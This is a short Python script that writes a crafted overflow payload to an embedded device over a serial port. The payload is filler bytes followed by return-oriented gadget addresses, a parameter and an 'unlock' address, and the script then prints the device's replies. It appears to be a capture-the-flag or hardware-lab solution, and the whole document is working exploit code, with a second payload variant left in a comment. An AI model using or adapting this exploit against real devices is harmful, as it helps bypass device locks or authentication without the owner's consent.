#!/usr/bin/env python3

import sys, serial

with serial.Serial(sys.argv[1], 115200, timeout=1) as port:
	gadget_le = b"\x55\x3A\x00\x00"
	gadget_nop_le = b"\xb7\x01\x00\x00"
	param_le = b"\x2A\x00\x00\x00"
	unlock_le = b"\x0D\x03\x00\x10"

	payload = b"A"*12 + gadget_nop_le + gadget_le + param_le + b"A"*12 + unlock_le
	# payload = b"A"*12 + unlock_le + param_le + b"A"*12 + unlock_le

	port.write(payload + b"\n")
	while True:
		print(port.read(1024))
